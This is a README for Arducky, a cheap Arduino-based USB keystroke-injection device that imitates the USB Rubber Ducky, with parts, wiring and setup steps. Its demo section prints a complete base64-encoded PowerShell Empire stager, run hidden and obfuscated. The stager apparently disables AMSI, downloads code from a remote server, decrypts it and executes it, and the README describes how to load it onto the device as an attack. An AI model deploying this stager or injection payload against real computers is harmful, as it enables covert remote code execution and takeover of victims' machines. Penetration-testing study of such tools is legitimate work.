Arducky - Arduino Ducky Script Interpreter
==========================================

This project aims to create a cheap alternative (but not less efficient) to Hak5's [USB Rubber Ducky](https://github.com/hak5darren/USB-Rubber-Ducky).

## Introduction ##

The USB Rubber Ducky is a [HID (Human Interface Device)](https://en.wikipedia.org/wiki/Human_interface_device) programmable
with a simple scripting language allowing penetration testers to quickly and easily craft and deploy security auditing payloads that
mimic human keyboard input.

Using Arducky, you only need to deal with [Ducky Script](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript) stored on a MicroSD card.

After setup, you'll no longer need to reprogram your Arduino to change scripts.

## Hardwares ##

| Quantity | Item                                                                          | Price  | Description                                                        |
|----------|-------------------------------------------------------------------------------|--------|--------------------------------------------------------------------|
| 1        | [Arduino Pro Micro ATmega32U4 5V Board](http://www.ebay.com/itm/221891843710) | $4.11  | Compatible with USB protocol, can be used as HID mouse or keyboard |
| 1        | [Micro SD Memory Shield](http://www.ebay.com/itm/322307601468)                | $0.78  |                                                                    |
| 1        | [Micro USB OTG Adapter](http://www.ebay.com/itm/391333526724)                 | $0.99  | Facultative. Can be used to replace micro USB cable                |
| 1        | [DuPont Wires](http://www.ebay.com/itm/181012025872)                          | $1.28  |                                                                    |
| 1        | [Micro SD Card](https://amzn.com/B00IVPU786)                                  | $18.00 | This is an example, doubt that you'll need more than 1GB           |

## Formatting ##

In order to use your Micro SD Card with Arducky, the card must be formatted to FAT32 filesystem.

I strongly recommend you to format your SD Card (even if it's a new!), using the official
SDA's (SD Association) [SD Memory Card Formatter](https://www.sdcard.org/downloads/formatter_4/index.html) rather than using formatting tools
provided with your operating system.

## Wiring ##

Now that you've formatted your MicroSD card, let's wire up the MicroSD shield!

The MicroSD controller interface has a total of six pins (GND, VCC, MISO, MOSI, SCK, CS).

Based on [Arduino SPI documentation](https://www.arduino.cc/en/Reference/SPI), the control interface must be conneted as following (using DuPont wires):

![arducky_pinout][]

**<u>Note:</u>** As mentioned in [hardwares](#Hardwares) section, the module is designed to interact with a 5V µC, thus you'll need 5V pin on your Arduino.

![arducky_right][]

![arduino_pro_micro][]

## Setup ##

Clone the project:

```bash
git clone https://gitlab.com/Creased/arducky
cd arducky/

```

If you're using an AZERTY keyboard, you'll also need to replace your Keyboard library (Keyboard.cpp and Keyboard.h) with [the included one](lib).

Upload the [arducky.ino](arducky.ino) sketch to your Arduino board using the [Arduino IDE](https://www.arduino.cc/en/Guide/Environment#toc9).

### Femtoduino ###

To generate the [arducky_femto.ino](arducky_femto.ino) file with a [Ducky Script](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript) payload, you can use [femto_generate_payload.py](femto_generate_payload.py):

```bash
~# python3 femto_generate_payload.py -h
usage: femto_generate_payload.py [-h] [-i ino_file] [-o output_file]
                                          payload_file

Generates payload in arducky_femto.ino from an input Rubber Ducky payload file

positional arguments:
  payload_file          input Rubber Ducky payload file

optional arguments:
  -h, --help            show this help message and exit
  -i ino_file, --ino ino_file
                        input Arducky ino file
  -o output_file, --out output_file
                        output Arducky ino file

```

Example:

```bash
~# python3 femto_generate_payload.py -i arducky_femto.ino -o femto.ino demo/script.txt

```

## The Empire strikes back with Arducky (demo) ##

Empire is a post-exploitation framework implementing the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from key loggers to Mimikatz.

In this demo, we'll deploy an Empire on a remote server (such as a VPS) on a Docker node and will use Arducky to join it.

### Setup ###

Please follow steps described [this guide](https://git.bmoine.fr/docker-powershell-empire).

### Ducky Script ###

By setting up a new Empire, you should get a payload such as (see [demo/](demo/) folder):

```powershell
powershell -noP -sta -w 1 -enc WwBSAGUAZgBdAC4AQQBzAFMARQBNAEIAbAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAVABGAEkAZQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAFUAZQAoACQAbgBVAEwAbAAsACQAVAByAHUAZQApAH0AOwBbAFMAWQBTAFQARQBNAC4ATgBFAHQALgBTAEUAcgB2AGkAYwBlAFAATwBJAG4AdABNAGEAbgBBAGcARQBSAF0AOgA6AEUAWABwAEUAYwBUADEAMAAwAEMAbwBOAHQAaQBOAFUARQA9ADAAOwAkAHcAYwA9AE4ARQB3AC0ATwBCAEoAZQBDAFQAIABTAFkAUwB0AEUATQAuAE4ARQB0AC4AVwBFAEIAQwBsAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABXAGMALgBIAGUAYQBEAGUAcgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABXAGMALgBQAHIATwBYAFkAPQBbAFMAeQBTAHQARQBNAC4ATgBFAHQALgBXAGUAQgBSAGUAcQB1AEUAUwBUAF0AOgA6AEQAZQBGAEEAVQBMAHQAVwBlAEIAUABSAG8AWABZADsAJAB3AEMALgBQAHIAbwBYAHkALgBDAHIAZQBEAEUAbgBUAEkAYQBMAFMAIAA9ACAAWwBTAFkAcwBUAEUAbQAuAE4ARQBUAC4AQwByAEUARABFAE4AVABJAEEAbABDAGEAYwBIAEUAXQA6ADoARABFAGYAYQBVAEwAVABOAEUAVAB3AG8AcgBLAEMAcgBlAGQARQBuAHQASQBBAGwAcwA7ACQASwA9AFsAUwBZAHMAdABlAE0ALgBUAEUAWABUAC4ARQBOAEMATwBEAGkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAeQB0AGUAcwAoACcASwBBAE4AcwAjADgAJQBtAHAAWgBpAGQAUABTAEwAaABhAF0AZwBWAFsAWQAuAEcAPwBuAGsAfQBGAGMALwAzACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAVwBDAC4ASABFAGEARABFAHIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AMgBtADAARQB6AEsALwBlAEEATQBTAE4AbQAxAEIAaABlAEYAUwBEAGYAZAB3AE0AaQBxAFEAPQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvAHYAcABzADIALgBiAG0AbwBpAG4AZQAuAGYAcgA6ADgAMAA4ADAAJwA7ACQAdAA9ACcALwBhAGQAbQBpAG4ALwBnAGUAdAAuAHAAaABwACcAOwAkAGQAQQB0AGEAPQAkAFcAQwAuAEQATwBXAE4AbABvAEEAZABEAGEAdABhACgAJABzAGUAUgArACQAVAApADsAJABJAFYAPQAkAEQAYQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAYQBUAEEAPQAkAEQAQQB0AEEAWwA0AC4ALgAkAEQAQQB0AGEALgBMAEUATgBnAHQAaABdADsALQBKAG8ASQBOAFsAQwBIAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==

```

Save it to a file named `stager.txt` and run [create_script.sh](create_script.sh) script in order to create the Ducky Script:

```bash
./create_script.sh

```

Copy the generated `script.txt` to the filesystem root of your MicroSD card and power up the Arducky.

Here is a video demonstrating the attack:

[![Demo video](https://i.ytimg.com/vi/jH1Yr2qMnUI/hqdefault.jpg)](https://youtu.be/jH1Yr2qMnUI).

Voilà!

![arducky_bottom][]
![arducky_front][]
![arducky_left][]
![arducky_top][]
![arducky_workbench][]

 [arducky_bottom]: illustrations/arducky_bottom.jpg
 [arducky_front]: illustrations/arducky_front.jpg
 [arducky_left]: illustrations/arducky_left.jpg
 [arducky_pinout]: illustrations/arducky_pinout.png
 [arducky_right]: illustrations/arducky_right.jpg
 [arducky_top]: illustrations/arducky_top.jpg
 [arducky_workbench]: illustrations/arducky_workbench.jpg
 [arduino_pro_micro]: illustrations/arduino_pro_micro.png
